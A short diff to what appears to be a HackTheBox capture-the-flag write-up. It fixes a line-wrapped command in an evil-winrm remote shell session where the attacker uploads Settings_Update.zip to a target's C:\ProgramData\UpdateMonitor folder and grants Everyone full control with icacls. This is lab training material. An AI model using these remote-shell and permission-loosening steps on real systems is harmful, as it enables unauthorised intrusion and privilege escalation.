@@ -523,8 +523,7 @@ Ill rezip it
 evil-winrm-py PS C:\ProgramData\UpdateMonitor> upload Settings_Update.zip .
 Uploading /home/kali/htb/logging/Settings_Update.zip: 100%|█████████████| 1.96k/1.96k [00:00<00:00, 32.6kB/s]
 [+] File uploaded successfully as: C:\ProgramData\UpdateMonitor\Settings_Update.zip
-evil-winrm-py PS C:\ProgramData\UpdateMonitor> icacls "C:\ProgramData\UpdateMonitor\Settings_Update.zip" /gran
-t Everyone:F
+evil-winrm-py PS C:\ProgramData\UpdateMonitor> icacls "C:\ProgramData\UpdateMonitor\Settings_Update.zip" /grant Everyone:F
 processed file: C:\ProgramData\UpdateMonitor\Settings_Update.zip
 Successfully processed 1 files; Failed processing 0 files
 evil-winrm-py PS C:\ProgramData\UpdateMonitor>
